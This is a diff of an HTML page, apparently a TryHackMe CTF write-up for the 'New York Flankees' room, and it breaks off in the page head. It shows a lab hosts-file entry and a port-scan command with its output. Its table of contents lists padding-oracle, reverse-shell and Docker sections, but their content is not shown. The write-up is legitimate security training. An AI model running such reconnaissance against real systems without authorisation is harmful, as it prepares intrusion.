@@ -1,31 +1,400 @@
-<!doctype html><html lang=en dir=ltr><head><title>New York Flankees | THM Writeup :: CyberJagadeesh - Learn Cyber Security</title>
-<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Introduction Detailed walkthrough for New York Flankees CTF challenges on TryHackMe .
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <title>New York Flankees | THM Writeup :: CyberJagadeesh - Learn Cyber Security</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Introduction Detailed walkthrough for New York Flankees CTF challenges on TryHackMe .
 Tools Used rustscan, burpsuite
 Enumeration Lets start the process by mapping host-name to target IP address.
-sudo echo &amp;#34;10.10.140.44 nythm.com&amp;#34; &amp;gt;&amp;gt; /etc/hosts Let&amp;rsquo;s start enumaration process using rustscan portscanner.
-rustscan -a nythm.com -- -sC -sV .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| | | ."><meta name=keywords content="cyber security,penetration testing,ethical hacking,vulnerability assessment,network security,application security,web application security,security testing,red teaming,bug bounty,CTFs,cybersecurity challenges,hacking tutorials,security tools,exploit development,reverse engineering,penetration tester,security researcher,security analyst,information security,digital forensics,incident response,threat intelligence,security awareness,social engineering,phishing,malware analysis,cryptography,cloud security,IoT security,mobile security,how to become a penetration tester,penetration testing tools,CTF challenges for beginners,web application penetration testing,network penetration testing,exploit development tutorial,reverse engineering techniques,bug bounty hunting tips,security research projects,cyber security certifications"><meta name=robots content="noodp"><link rel=manifest href=/manifest.json><meta property="og:url" content="https://cyberjagadeesh.github.io/posts/thenewyorkflankees/writeup/"><meta property="og:site_name" content="CyberJagadeesh"><meta property="og:title" content="New York Flankees | THM Writeup"><meta property="og:description" content='Introduction Detailed walkthrough for New York Flankees CTF challenges on TryHackMe .
+sudo echo &#34;10.10.140.44 nythm.com&#34; &gt;&gt; /etc/hosts Let&rsquo;s start enumaration process using rustscan portscanner.
+rustscan -a nythm.com -- -sC -sV .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| | | .-. \| {_} |.-._} } | | .-._} }\ }/ /\ \| |\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. _______________________________________ Open 10.10.140.44:22 Open 10.10.140.44:8080 [~] Starting Script(s) [&gt;] Running script &#34;nmap -vvv -p {{port}} {{ip}} -sC -sV&#34; on ip 10.10.140.44 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 86:03:99:d9:07:c6:f5:8c:48:11:b7:56:58:fe:72:06 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAHznW6yrO1o2or52QbWKmOLRYEcbWUD2zy0gHcYzw2sqhx9U/pJxJOa5Z0fwuMVPjRtqGLOk3EOrBnQ6LstnOyGx0KUsBn3c/hSHNCS9uzVbDzikf6ffQLw0hAcJzSi1EsQDRkeyJ24NuzhQ9RXKO1R1Gr0RB4AcmvIoNspcxV0KTiTOIWuAPiJLiZtsOSS39zghuRjvWwnWQ3jR0X2r5NPjphojx3pKxlDNhf9gpaz2kck/Jv8cfktisANej2q4JY&#43;BEL9VaxyBV8DOq/WU9E8TvIGYEK1sOh1UKCl7JgKBbA&#43;30Wge&#43;/EsiV/zEQooDQvNUT5YgUwCCAdClLYxR996glhDywuGYIAOE/VIP69k0JAbkZy8kwP22t0ZHunJrFaPWL5iw&#43;&#43;O6/NKTL2xQXwAmKZu81B7Un3Q35lal7k6YO9agJJ4oxD7z15Ee&#43;eJf4KxSOYhSA89KhDQSbrkpZKMyuJ6uoJHXVVyZmMRO2IaraJaY156vZxe9fkOyLvE= | 256 0e:b9:fd:e8:8a:7c:fc:b9:91:b0:3d:0d:16:c9:43:3c (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN1JAvVFTNHO87FGw&#43;Q3NxpS0st1TbH9/Tn&#43;PLJMBdVQ/NHeBZSdt/954gYSL6c0Plt8YiuVswjf//DSHz1rff0= | 256 9c:be:88:a2:44:56:2b:ba:dd:b9:5a:da:f2:24:8a:f5 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILwrt82psPblgKYPcZ1VkSr/bVktYgYaVX&#43;zqGdFFrwK 8080/tcp open http syn-ack ttl 59 Octoshape P2P streaming web service |_http-title: Hello world! | http-methods: |_ Supported Methods: GET |_http-favicon: Unknown favicon MD5: 6FD74A43E6C5F7502642326FAB0B3E69 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel From the above results we found 2 open ports 22(ssh) and 8080(web server) and the operating system is Linux. Starting with port 8080.
+"
+/>
+<meta
+  name="keywords"
+  content="cyber security, penetration testing, ethical hacking, vulnerability assessment, network security, application security, web application security, security testing, red teaming, bug bounty, CTFs, cybersecurity challenges, hacking tutorials, security tools, exploit development, reverse engineering, penetration tester, security researcher, security analyst, information security, digital forensics, incident response, threat intelligence, security awareness, social engineering, phishing, malware analysis, cryptography, cloud security, IoT security, mobile security, how to become a penetration tester, penetration testing tools, CTF challenges for beginners, web application penetration testing, network penetration testing, exploit development tutorial, reverse engineering techniques, bug bounty hunting tips, security research projects, cyber security certifications"
+/>
+<meta name="robots" content="noodp" /><link rel="manifest" href="/manifest.json" /><meta property="og:url" content="https://cyberjagadeesh.github.io/posts/thenewyorkflankees/writeup/">
+  <meta property="og:site_name" content="CyberJagadeesh">
+  <meta property="og:title" content="New York Flankees | THM Writeup">
+  <meta property="og:description" content="Introduction Detailed walkthrough for New York Flankees CTF challenges on TryHackMe .
 Tools Used rustscan, burpsuite
 Enumeration Lets start the process by mapping host-name to target IP address.
-sudo echo "10.10.140.44 nythm.com" >> /etc/hosts Let’s start enumaration process using rustscan portscanner.
-rustscan -a nythm.com -- -sC -sV .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| | | .'><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-08-04T07:35:56+05:30"><meta property="article:modified_time" content="2024-08-04T07:35:56+05:30"><meta property="article:tag" content="Oracle Padding"><meta property="article:tag" content="Docker"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/thm/backtrack/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/block/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/pyrat/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/thelondonbridge/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/cheesectf/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/breakme/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/certaindoom/writeup/"><meta name=twitter:card content="summary"><meta name=twitter:title content="New York Flankees | THM Writeup"><meta name=twitter:description content='Introduction Detailed walkthrough for New York Flankees CTF challenges on TryHackMe .
+sudo echo &#34;10.10.140.44 nythm.com&#34; &gt;&gt; /etc/hosts Let’s start enumaration process using rustscan portscanner.
+rustscan -a nythm.com -- -sC -sV .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| | | .-. \| {_} |.-._} } | | .-._} }\ }/ /\ \| |\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. _______________________________________ Open 10.10.140.44:22 Open 10.10.140.44:8080 [~] Starting Script(s) [&gt;] Running script &#34;nmap -vvv -p {{port}} {{ip}} -sC -sV&#34; on ip 10.10.140.44 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 86:03:99:d9:07:c6:f5:8c:48:11:b7:56:58:fe:72:06 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAHznW6yrO1o2or52QbWKmOLRYEcbWUD2zy0gHcYzw2sqhx9U/pJxJOa5Z0fwuMVPjRtqGLOk3EOrBnQ6LstnOyGx0KUsBn3c/hSHNCS9uzVbDzikf6ffQLw0hAcJzSi1EsQDRkeyJ24NuzhQ9RXKO1R1Gr0RB4AcmvIoNspcxV0KTiTOIWuAPiJLiZtsOSS39zghuRjvWwnWQ3jR0X2r5NPjphojx3pKxlDNhf9gpaz2kck/Jv8cfktisANej2q4JY&#43;BEL9VaxyBV8DOq/WU9E8TvIGYEK1sOh1UKCl7JgKBbA&#43;30Wge&#43;/EsiV/zEQooDQvNUT5YgUwCCAdClLYxR996glhDywuGYIAOE/VIP69k0JAbkZy8kwP22t0ZHunJrFaPWL5iw&#43;&#43;O6/NKTL2xQXwAmKZu81B7Un3Q35lal7k6YO9agJJ4oxD7z15Ee&#43;eJf4KxSOYhSA89KhDQSbrkpZKMyuJ6uoJHXVVyZmMRO2IaraJaY156vZxe9fkOyLvE= | 256 0e:b9:fd:e8:8a:7c:fc:b9:91:b0:3d:0d:16:c9:43:3c (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN1JAvVFTNHO87FGw&#43;Q3NxpS0st1TbH9/Tn&#43;PLJMBdVQ/NHeBZSdt/954gYSL6c0Plt8YiuVswjf//DSHz1rff0= | 256 9c:be:88:a2:44:56:2b:ba:dd:b9:5a:da:f2:24:8a:f5 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILwrt82psPblgKYPcZ1VkSr/bVktYgYaVX&#43;zqGdFFrwK 8080/tcp open http syn-ack ttl 59 Octoshape P2P streaming web service |_http-title: Hello world! | http-methods: |_ Supported Methods: GET |_http-favicon: Unknown favicon MD5: 6FD74A43E6C5F7502642326FAB0B3E69 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel From the above results we found 2 open ports 22(ssh) and 8080(web server) and the operating system is Linux. Starting with port 8080.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-04T07:35:56+05:30">
+    <meta property="article:modified_time" content="2024-08-04T07:35:56+05:30">
+    <meta property="article:tag" content="Oracle Padding">
+    <meta property="article:tag" content="Docker">
+      <meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/thm/backtrack/writeup/">
+      <meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/block/writeup/">
+      <meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/pyrat/writeup/">
+      <meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/thelondonbridge/writeup/">
+      <meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/cheesectf/writeup/">
+      <meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/breakme/writeup/">
+      <meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/certaindoom/writeup/">
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="New York Flankees | THM Writeup">
+  <meta name="twitter:description" content="Introduction Detailed walkthrough for New York Flankees CTF challenges on TryHackMe .
 Tools Used rustscan, burpsuite
 Enumeration Lets start the process by mapping host-name to target IP address.
-sudo echo "10.10.140.44 nythm.com" >> /etc/hosts Let’s start enumaration process using rustscan portscanner.
-rustscan -a nythm.com -- -sC -sV .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| | | .'><link rel=canonical href=https://cyberjagadeesh.github.io/posts/thenewyorkflankees/writeup/><link rel="shortcut icon" href=/favicon.ico><link rel=stylesheet href=/css/index.min.1f9b3e6594d41770030cc9cea67e9220cd9066bb33910ebfb19ea46cf6b4b50c.css><script async src="https://www.googletagmanager.com/gtag/js?id=G-376DY6PW0W"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-376DY6PW0W")}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"Article","author":{"@type":"Person","name":"CyberJagadeesh"},"dateModified":"2024-08-04T07:35:56+05:30","datePublished":"2024-08-04T07:35:56+05:30","description":"Introduction Detailed walkthrough for New York Flankees CTF challenges on TryHackMe .\nTools Used rustscan, burpsuite\nEnumeration Lets start the process by mapping host-name to target IP address.\nsudo echo \u0026#34;10.10.140.44 nythm.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts Let\u0026rsquo;s start enumaration process using rustscan portscanner.\nrustscan -a nythm.com -- -sC -sV .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .","image":"/posts/thenewyorkflankees/NYFlankees.png","name":"New York Flankees | THM Writeup","url":"https://cyberjagadeesh.github.io/posts/thenewyorkflankees/writeup/"}</script></head><body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800"><header class="flex flex-none justify-center z-10"><div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3"><div class="flex-none ml-2 md:ml-0"><a href=/><img class="h-12 w-12 rounded-full object-cover bg-gray-100" src=/logo.png alt=logo></a></div><div class=flex-1></div><div class=flex-none><nav class="h-full static"><button id=navbar-menu-toggle type=button class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls=navbar-menu aria-expanded=false>
-<span class=sr-only>Open main menu</span>
-<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 6h16"/><path d="M4 12h16"/><path d="M4 18h16"/></svg></i></button><div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id=navbar-menu><ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5"><li id=about><a class="block px-3 py-3 hover:text-emerald-600" href=/about/ title=About>About</a></li><li id=post><a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600" href=/posts/ title=Post>Post</a></li></ul></div></nav></div><div class="flex-none mx-1"></div><div class="flex-none md:hidden"><a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls=navbar-menu aria-expanded=false><span class=sr-only>Search</span>
-<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1014 0A7 7 0 103 10"/><path d="M21 21l-6-6"/></svg></i></a></div><div class="darkmode-toggle flex flex-none mr-2 md:mr-0"><label for=darkmode-toggle class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode"><input name=darkmode-toggle id=darkmode-toggle type=checkbox class="sr-only peer" aria-label="Toggle dark mode"><div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700"><i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible"><svg class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-3 0a3 3 0 106 0 3 3 0 10-6 0"/><path d="M12 5v.01"/><path d="M17 7v.01"/><path d="M19 12v.01"/><path d="M17 17v.01"/><path d="M12 19v.01"/><path d="M7 17v.01"/><path d="M5 12v.01"/><path d="M7 7v.01"/></svg>
-</i><i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible"><svg class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 3c.132.0.263.0.393.0a7.5 7.5.0 007.92 12.446A9 9 0 1112 2.992z"/><path d="M17 4a2 2 0 002 2 2 2 0 00-2 2 2 2 0 00-2-2 2 2 0 002-2"/><path d="M19 11h2m-1-1v2"/></svg></i></div></label></div></div></header><main class="flex flex-auto justify-center"><div class="w-full max-w-4xl lg:max-w-5xl"><div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700"><div><a href=/posts/thenewyorkflankees/writeup/><figure><img class="w-full object-cover h-36 md:h-48 xl:h-60" src=/posts/thenewyorkflankees/NYFlankees.png alt="New York Flankees | THM Writeup" title="New York Flankees | THM Writeup" loading=lazy></figure></a></div><div class="flex flex-col gap-y-3 p-6"><h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100"><a href=/posts/thenewyorkflankees/writeup/>New York Flankees | THM Writeup</a></h1><ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300"><li><a href=/categories/ctf/ class="text-sm mr-2 px-2 py-1 rounded border border-emerald-800 bg-emerald-800 text-slate-50">CTF</a></li><li><a href=/tags/oracle-padding/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
-</i><span class=ml-0>Oracle Padding</span></a></li><li><a href=/tags/docker/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
-</i><span class=ml-0>Docker</span></a></li><li><a href=/series/tryhackme/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
-</i><span class=ml-0>Tryhackme</span></a></li><li><a href=/platforms/linux/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
-</i><span class=ml-0>Linux</span></a></li><li><a href=/levels/medium/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
-</i><span class=ml-0>Medium</span></a></li></ul><div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300"><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 7a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V7z"/><path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/><path d="M11 15h1"/><path d="M12 15v3"/></svg>
-</i><time datetime=2024-08-04T07:35:56+05:30>2024-08-04</time></div><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6.5 7h11"/><path d="M6 20v-2a6 6 0 1112 0v2a1 1 0 01-1 1H7a1 1 0 01-1-1z"/><path d="M6 4v2a6 6 0 1012 0V4a1 1 0 00-1-1H7A1 1 0 006 4z"/></svg>
-</i><span>5 minutes to read</span></div></div><section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6"><h2>Table of Contents</h2><aside><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a><ul><li><a href=#tools-used>Tools Used</a></li></ul></li><li><a href=#enumeration>Enumeration</a><ul><li><a href=#padding-oracle>Padding Oracle</a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#admin-login>Admin login</a></li><li><a href=#reverse-shell>Reverse Shell</a></li><li><a href=#interactive-shell>Interactive shell</a></li><li><a href=#docker>Docker</a></li></ul></li></ul></nav></aside></section><article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content"><h2 id=introduction>Introduction</h2><p>Detailed walkthrough for <a href=https://tryhackme.com/r/room/thenewyorkflankees target=_blank rel=noopener>New York Flankees</a>
-CTF challenges on <a href=https://tryhackme.com target=_blank rel=noopener>TryHackMe</a>
-.</p><h3 id=tools-used>Tools Used</h3><p>rustscan, burpsuite</p><h2 id=enumeration>Enumeration</h2><p>Lets start the process by mapping host-name to target IP address.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo <span class=nb>echo</span> <span class=s2>&#34;10.10.140.44 nythm.com&#34;</span> &gt;&gt; /etc/hosts
-</span></span></code></pre></div><p>Let&rsquo;s start enumaration process using rustscan portscanner.</p><pre tabindex=0><code>rustscan -a nythm.com -- -sC -sV         
+sudo echo &#34;10.10.140.44 nythm.com&#34; &gt;&gt; /etc/hosts Let’s start enumaration process using rustscan portscanner.
+rustscan -a nythm.com -- -sC -sV .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| | | .-. \| {_} |.-._} } | | .-._} }\ }/ /\ \| |\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. _______________________________________ Open 10.10.140.44:22 Open 10.10.140.44:8080 [~] Starting Script(s) [&gt;] Running script &#34;nmap -vvv -p {{port}} {{ip}} -sC -sV&#34; on ip 10.10.140.44 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 86:03:99:d9:07:c6:f5:8c:48:11:b7:56:58:fe:72:06 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAHznW6yrO1o2or52QbWKmOLRYEcbWUD2zy0gHcYzw2sqhx9U/pJxJOa5Z0fwuMVPjRtqGLOk3EOrBnQ6LstnOyGx0KUsBn3c/hSHNCS9uzVbDzikf6ffQLw0hAcJzSi1EsQDRkeyJ24NuzhQ9RXKO1R1Gr0RB4AcmvIoNspcxV0KTiTOIWuAPiJLiZtsOSS39zghuRjvWwnWQ3jR0X2r5NPjphojx3pKxlDNhf9gpaz2kck/Jv8cfktisANej2q4JY&#43;BEL9VaxyBV8DOq/WU9E8TvIGYEK1sOh1UKCl7JgKBbA&#43;30Wge&#43;/EsiV/zEQooDQvNUT5YgUwCCAdClLYxR996glhDywuGYIAOE/VIP69k0JAbkZy8kwP22t0ZHunJrFaPWL5iw&#43;&#43;O6/NKTL2xQXwAmKZu81B7Un3Q35lal7k6YO9agJJ4oxD7z15Ee&#43;eJf4KxSOYhSA89KhDQSbrkpZKMyuJ6uoJHXVVyZmMRO2IaraJaY156vZxe9fkOyLvE= | 256 0e:b9:fd:e8:8a:7c:fc:b9:91:b0:3d:0d:16:c9:43:3c (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN1JAvVFTNHO87FGw&#43;Q3NxpS0st1TbH9/Tn&#43;PLJMBdVQ/NHeBZSdt/954gYSL6c0Plt8YiuVswjf//DSHz1rff0= | 256 9c:be:88:a2:44:56:2b:ba:dd:b9:5a:da:f2:24:8a:f5 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILwrt82psPblgKYPcZ1VkSr/bVktYgYaVX&#43;zqGdFFrwK 8080/tcp open http syn-ack ttl 59 Octoshape P2P streaming web service |_http-title: Hello world! | http-methods: |_ Supported Methods: GET |_http-favicon: Unknown favicon MD5: 6FD74A43E6C5F7502642326FAB0B3E69 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel From the above results we found 2 open ports 22(ssh) and 8080(web server) and the operating system is Linux. Starting with port 8080.">
+
+
+<link rel="canonical" href="https://cyberjagadeesh.github.io/posts/thenewyorkflankees/writeup/" />
+
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="stylesheet" href="/css/index.min.1f9b3e6594d41770030cc9cea67e9220cd9066bb33910ebfb19ea46cf6b4b50c.css">
+
+
+
+
+
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-376DY6PW0W"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-376DY6PW0W');
+        }
+      </script>
+
+
+
+
+  
+  <script type="application/ld+json">
+  {"@context":"https://schema.org","@type":"Article","author":{"@type":"Person","name":"CyberJagadeesh"},"dateModified":"2024-08-04T07:35:56+05:30","datePublished":"2024-08-04T07:35:56+05:30","description":"Introduction Detailed walkthrough for New York Flankees CTF challenges on TryHackMe .\nTools Used rustscan, burpsuite\nEnumeration Lets start the process by mapping host-name to target IP address.\nsudo echo \u0026#34;10.10.140.44 nythm.com\u0026#34; \u0026gt;\u0026gt; /etc/hosts Let\u0026rsquo;s start enumaration process using rustscan portscanner.\nrustscan -a nythm.com -- -sC -sV .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. _______________________________________ Open 10.10.140.44:22 Open 10.10.140.44:8080 [~] Starting Script(s) [\u0026gt;] Running script \u0026#34;nmap -vvv -p {{port}} {{ip}} -sC -sV\u0026#34; on ip 10.10.140.44 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 86:03:99:d9:07:c6:f5:8c:48:11:b7:56:58:fe:72:06 (RSA) | ssh-rsa 